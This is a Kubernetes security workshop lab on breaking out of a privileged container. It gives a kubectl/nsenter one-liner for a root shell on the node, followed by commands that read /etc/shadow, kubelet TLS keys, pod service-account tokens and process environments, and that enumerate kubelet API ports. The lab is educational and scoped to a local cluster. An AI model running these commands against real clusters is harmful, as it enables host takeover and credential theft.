# Privileged Container

An attacker who can create a privileged container in Kubernetes gains full access to the underlying host's file system, process tree, and network stack — effectively escaping the container boundary and obtaining root-level control of the node.

## Description

Privileged containers are containers that are running with the `--privileged` flag. This flag gives the container all the capabilities of the host machine and disables most of the kernel namespace and seccomp restrictions that normally isolate a container from the host. Attackers who have permissions to create privileged containers can use them to escape the container and get access to the host.

Once on the host, an attacker can read secrets from other pods, tamper with the kubelet, access cloud instance metadata, and pivot to the rest of the cluster.

## Prerequisites

- A running Kubernetes cluster (e.g., `workshop-cluster` via Kind).
- `kubectl` installed and configured to connect to your cluster.
- Permissions to create pods with `securityContext.privileged: true`.

## Quick Start

### 1. Launch a privileged container with host PID and full capabilities

The following command deploys a privileged pod that immediately uses `nsenter` to enter all host namespaces, giving you a root shell on the node:

```bash
kubectl run r00t --restart=Never -ti --rm --image lol --overrides '{"spec":{"hostPID": true, "containers":[{"name":"1","image":"alpine","command":["nsenter","--mount=/proc/1/ns/mnt","--ipc=/proc/1/ns/ipc","--net=/proc/1/ns/net","--uts=/proc/1/ns/uts","--","/bin/bash"],"stdin": true,"tty":true,"securityContext":{"privileged":true}}]}}'
```

What this does:

- `hostPID: true` — shares the host's PID namespace, making all host processes visible.
- `securityContext.privileged: true` — removes capability restrictions and grants all Linux capabilities.
- `nsenter` — enters the host's mount, IPC, network, and UTS namespaces, giving a shell that operates directly on the host.

You now have a root shell on the Kubernetes node. The following sections demonstrate what an attacker can do from this position.

---

## File System Isolation Breakout

### 1. Inspect sensitive files and folders on the compromised node

```bash
# Contains the user account information for all users on the system
cat /etc/passwd
# Contains the hashed passwords for all users on the system
cat /etc/shadow
# Similar to /etc/shadow, but for group account passwords
cat /etc/gshadow
# Defines privileges for users and groups regarding the use of sudo
cat /etc/sudoers
ls /etc/sudoers.d/
# The home directory of the root user
ls /root
# The home folders of all users in the system
ls /home
```

### 2. Identify which node the privileged container is running on

```bash
# node name would usually be on the /etc/hosts file
cat /etc/hosts
# node name would be passed via the --hostname-override flag in kube-proxy
ps -aux | grep "kube-proxy"
```

### 3. Inspect files and folders that belong to the `kubelet` process

```bash
# kubelet configuration
cat /var/lib/kubelet/config.yaml
# kubelet client and server TLS keys
ls -lhra /var/lib/kubelet/pki
# list pods managed by kubelet
ls -lhra /var/lib/kubelet/pods
```

### 4. Inspect the running containers' virtual file systems

```bash
ls -lhra /var/lib/containerd/io.containerd.snapshotter.v1.overlayfs
```

### 5. Inspect the mounted volumes and secrets for a particular pod

> Where `$PODID` is the UUID of a pod visible under `/var/lib/kubelet/pods/`.

```bash
# list mounted volumes
ls -lhra /var/lib/kubelet/pods/$PODID/volumes
# display the service account token for this pod
cat /var/lib/kubelet/pods/$PODID/volumes/kubernetes.io~projected/kube-api-access-t4spf/token
```

### 6. Inspect the logs for a particular container

```bash
# list log files for all containers on this node
ls -lhar /var/log/containers
# display logs for a particular container, where $CONTAINERID is the filename
cat /var/log/containers/${CONTAINERID}.log
```

---

## Processes Isolation Breakout

### 1. Enumerate host processes

Run `top` or `ps -aux` and look for interesting processes such as `kubelet`, `containerd`, and `systemd`:

```bash
ps -aux | grep -E "kubelet|containerd|systemd"
```

### 2. Inspect environment variables of privileged processes

```bash
# $PID is the ID of the kubelet, containerd, or systemd process
cat /proc/$PID/environ
```

Example output (kubelet at PID 235):

```bash
# ie: cat /proc/235/environ
HTTPS_PROXY=HTTP_PROXY=LANG=C.UTF-8NO_PROXY=PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/binINVOCATION_ID=047f52a1d2854c73b39863c31edb2639JOURNAL_STREAM=8:243012KUBELET_KUBECONFIG_ARGS=--bootstrap-kubeconfig=/etc/kubernetes/bootstrap-kubelet.conf --kubeconfig=/etc/kubernetes/kubelet.confKUBELET_CONFIG_ARGS=--config=/var/lib/kubelet/config.yamlKUBELET_KUBEADM_ARGS=--container-runtime-endpoint=unix:///run/containerd/containerd.sock --node-ip=172.19.0.5 --node-labels= --pod-infra-container-image=registry.k8s.io/pause:3.9 --provider-id=kind://docker/workshop-cluster/workshop-cluster-worker2KUBELET_EXTRA_ARGS=--runtime-cgroups=/system.slice/containerd.service
```

From this output, identify the node IP and the path to the `kubelet.conf` kubeconfig file.

---

## Network Isolation Breakout

### 1. List all listening sockets on the compromised node

```bash
ss -nltp
```

Example output:

```
State  Recv-Q Send-Q Local Address:Port  Peer Address:Port Process
LISTEN 0      4096      127.0.0.11:38803      0.0.0.0:*
LISTEN 0      4096       127.0.0.1:41225      0.0.0.0:*    users:(("containerd",pid=105,fd=10))
LISTEN 0      4096       127.0.0.1:10248      0.0.0.0:*    users:(("kubelet",pid=234,fd=17))
LISTEN 0      4096       127.0.0.1:10249      0.0.0.0:*    users:(("kube-proxy",pid=384,fd=11))
LISTEN 0      4096               *:10250            *:*    users:(("kubelet",pid=234,fd=25))
LISTEN 0      4096               *:10256            *:*    users:(("kube-proxy",pid=384,fd=8))
```

Notable ports:

| Port  | Process    | Description                                  |
|-------|------------|----------------------------------------------|
| 10248 | kubelet    | Healthz endpoint (localhost only)            |
| 10249 | kube-proxy | Metrics endpoint (localhost only)            |
| 10250 | kubelet    | API endpoint — accepts pod exec/logs requests |
| 10256 | kube-proxy | Healthz endpoint                             |

An attacker with access to port 10250 can use the kubelet API to exec commands into any pod on this node or retrieve their logs.

---

## Cleanup

End the lab by pressing `Ctrl-C` from the privileged container, which terminates and removes the `r00t` pod (the `--rm` flag ensures automatic deletion).

If the pod is still present after exiting:

```bash
kubectl delete pod r00t 2>/dev/null || true
```

## Resources

- [Privileged Containers](https://kubernetes.io/docs/tasks/configure-pod-container/security-context/#set-the-security-context-for-a-pod)
- [Kubelet](https://kubernetes.io/docs/reference/command-line-tools-reference/kubelet/)
- [Container Runtimes](https://medium.com/nttlabs/the-internals-and-the-latest-trends-of-container-runtimes-2023-22aa111d7a93)
- [Kubernetes Internals](https://github.com/shubheksha/kubernetes-internals)
- [Nsenter](https://man7.org/linux/man-pages/man1/nsenter.1.html)
- [MITRE ATT&CK — Escape to Host](https://attack.mitre.org/techniques/T1611/)
